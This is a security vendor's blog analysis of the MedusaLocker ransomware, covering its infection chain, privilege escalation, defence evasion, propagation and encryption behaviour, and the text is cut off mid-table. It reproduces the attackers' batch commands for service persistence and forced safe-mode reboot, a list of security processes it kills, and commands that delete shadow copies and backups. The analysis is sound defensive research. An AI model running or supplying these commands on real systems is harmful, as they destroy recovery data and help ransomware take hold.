Cybereason vs. MedusaLocker Ransomwarecybereason.com/blog/medusalocker-ransomwareBack to Blog Cybereason Nocturnus Nov 19, 2020Research by: Tom Fakterman and Assaf DahanBackgroundThe MedusaLocker ransomware first emerged in September 2019, infecting and encrypting Windows machines around the world. There have been reports of MedusaLocker attacks across multiple industries, especially the healthcare industry which suffered a great deal of ransomware attacks during the COVID-19 pandemic.In order to maximize the chances of successful encryption of the files on the compromised machine, MedusaLocker restarts the machine in safe mode before execution. This method is used to avoid security tools that might not run when the computer starts in safe mode.MedusaLocker avoids encrypting executable files, most likely to avoid rendering the targeted system unusable for paying the ransom. To make it even more dangerous, MedusaLocker uses a combination of AES and RSA-2048, making the procedure of brute forcing the encryption practically impossible.Recently, there have been reports stating that AKO, a variant of MedusaLocker, added an element of blackmail, threatening to release stolen files publicly. This method of blackmail or extortion is starting to gain popularity in the ransomware market as reported by Cybereason earlier this year.Although data leak extortion threats have been found in some of MedusaLocker’s ransom notes, Cybereason did not observe evidence of information actually being exfiltrated by the MedusaLocker ransomware at the time of this research.Cybereason Blocks MedusaLocker RansomwareKey Points1. High Severity: The Cybereason Nocturnus Team assesses the threat level as HIGH given the destructive potential of attack.2. Encrypting mapped drives: MedusaLocker encrypts shared network drives of adjacent machines on the network.3. Attempted extortion: The ransom note left by new MedusaLocker variants contains threats to publicly reveal stolen data if payments are not made.4. Detected and Prevented: Cybereason’s platform fully detects and prevents the MedusaLocker ransomware.Breaking Down the AttackMany MedusaLocker infections typically start with two files, a ‘batch’ file and a powershell script saved as a ‘txt’ file:qzy.bat qzy.txtContents of the Batch fileThe qzy.bat file deployed by the attackers is designed to create persistence via a Windows Service. The service does the following tasks:1. Executes a Powershell script that resides in C:\Windows\SysWOW6\qzy.txt, which contains the Ransomware payload.2. Changes registry keys to allow the service to run in safe mode.3. Enforce restart in safe mode.4. Restart the infected host.sc create purebackup binpath= "%COMSPEC% /C start /b C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe -c $km = [IO.File]::ReadAllText('C:\Windows\SysWOW64\qzy.txt'); IEX $km" start= auto DisplayName= "purebackup"reg add HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal\BackupLP /freg add HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal\BackupLP /ve /d \"Service\" /fbcdedit /set {default} safeboot minimalshutdown /r /f /t 00 & del %0The batch file execution portrayed in Cybereason attack tree:1/7MedusaLocker Batch file executionAfter the machine is restarted in safe mode, the created service executes and the powershell script runs. This powershell script is a PowerSploit script known as “Invoke-ReflectivePEInjection”. The script reflectively loads the MedusaLocker ransomware to the powershell process memory.The MedusaLocker binary encoded with base64 in the script:Powershell script snippetMutex DetectionThe first thing MedusaLocker does is to check if a process with the mutex “{8761ABBD-7F85-42EE-B272-A76179687C63}” exists on the machine. If the mutex already exists, the ransomware will stop its execution.CMSTP UAC BYPASS / Privilege EscalationMedusaLocker uses a known UAC bypass technique also used by other malware such as Trickbot that allows the ransomware to run with escalated privileges that enable it to carry out administrative operations. It achieves privilege escalation by leveraging the built-in Windows tool CMSTP.exe to Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. An “%AppData%\Roaming\svchostt.exe” (depends on the malware variant). And then, creates persistence by a scheduled task named “svhost” which executes every 15 minutes:Scheduled task in CybereasonBypassing Security ProductsMedusaLocker will attempt to disable or terminate certain process and security products:wxServer.exe,wxServerView,sqlservr.exe,sqlmangr.exe,RAgui.exe,supervise.exe,Culture.exe,RTVscan.exe,Defwatch.exe,sqlbrowser.exe,winword.exe,QBW32.exe,QBDBMgr.exe,qbupdate.exe,QBCFMonitorService.exe,axlbridge.exe,QBIDPService.exe,httpd.exe,fdlauncher.exe,MsDtSrvr.exe,tomcat6.exe,java.exe,360se.exe,360doctor.exe,wdswfsafe.exe,fdlauncher.exe,fdhost.exe,GDscan.exe,ZhuDongFangYu.exeIn addition, it will attempt to disable the following services:wrapper,DefWatch,ccEvtMgr,ccSetMgr,SavRoam,sqlservr,sqlagent,sqladhlp,Culserver,RTVscan,sqlbrowser,SQLADHLP,QBIDPService,Intuit.QuickBooks.FCS,QBCFMonitorService,sqlwriter,msmdsrv,tomcat6,zhudongfangyu,SQLADHLP,vmware- usbarbitator64,vmware-converter,dbsrv12,dbeng8Deleting Backups and Preventing RecoveryMedusaLocker uses the following hardcoded commands to remove backups in order to foil any recovery attempts:Hardcoded commands in the malwareCommandPurposevssadmin.exe Delete Shadows /All /QuietDeleting all shadow copy volumesbcdedit.exe /set {default} recoveryenabled NoDisabling Automatic Startup Repairbcdedit.exe /set {default} bootstatuspolicy ignoreallfailuresDisabling Windows Error Recovery on startupwbadmin DELETE SYSTEMSTATEBACKUPDeleting backup for Windows Serverwbadmin DELETE SYSTEMSTATEBACKUP -deleteOldestDeleting the oldest backup on Windows ServerMedusaLocker execution in the memory of powersehll.exe:3/7MedusaLocker execution from PowershellScanning and Propagating to Remote MachinesAfter a successful infection, the MedusaLocker will scan the entire subnet in order to detect other hosts and shared folders. The ransomware edits the value “EnableLinkedConnections” of the following registry key:HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CurrentVersion\Policies\System“EnableLinkedConnections” value is changedIt does that so it can connect to other adjacent hosts residing on the same network, and in addition, tries to ping the entire subnet to see which hosts are alive:Ping sweep to find live hostsEncryption Whitelist FoldersMedusaLocker avoids encrypting executable files as well as taking a whitelisting approach, and encrypts files in most folders with the exception of:%User Profile%\AppData\ProgramData\Program Files\Program Files (x86)\AppData\Application Data\intel\nvidia\Users\All Users\WindowsRansom NoteAlthough the ransom note of MeduzaLocker states that data has been exfiltrated, we have not observed indications of such behavior at the moment by the malware:4/7Ransom noteCybereason Detection and PreventionCybereason is able to both detect and prevent the execution of MedusaLocker using the powershell protection component:Malicious powershell script preventedAdditionally, when the Anti-Ransomware feature is enabled, behavioral detection techniques in the platform are able to detect the deletion of the shadow copies using vssadmin.exe, which will create a Malop for the ransomware behaviour:Ransomware preventedMitre Att&ck BreakdownExecutionPersistencePrivilege EscalationDefense EvasionLateral MovementImpactWindows Command ShellWindows ServiceBypass User Access ControlDynamic-link Library InjectionSMB/Windows Admin SharesData Encrypted for Impact5/7PowershellScheduled 